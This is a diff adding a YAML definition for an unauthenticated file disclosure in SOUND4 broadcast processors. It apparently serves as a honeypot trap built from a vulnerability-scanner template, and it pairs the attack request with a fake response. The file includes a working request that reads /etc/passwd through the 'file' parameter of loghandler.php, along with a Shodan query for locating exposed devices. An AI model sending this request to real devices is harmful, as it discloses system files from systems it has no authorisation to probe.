@@ -1,0 +1,28 @@
+id: sound4-file-disclosure
+info:
+  name: SOUND4 IMPACT/FIRST/PULSE/Eco <=2.x (PHPTail) Unauthenticated File Disclosure
+  author: arafatansari
+  description: 'The application suffers from an unauthenticated file disclosure vulnerability.
+    Using the ''file'' GET parameter attackers can disclose arbitrary files on the
+    affected device and disclose sensitive and system information.
+
+    '
+  severity: medium
+  reference:
+  - https://packetstormsecurity.com/files/170263/SOUND4-IMPACT-FIRST-PULSE-Eco-2.x-Unauthenticated-File-Disclosure.html
+  - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2022-5736.php
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: http.html:"SOUND4"
+  tags: packetstorm,lfi,sound4,unauth,disclosure
+traps:
+- request:
+    method: GET
+    path: /cgi-bin/loghandler.php?ajax=251&file=/mnt/old-root/etc/passwd
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: root:[x*]:0:0
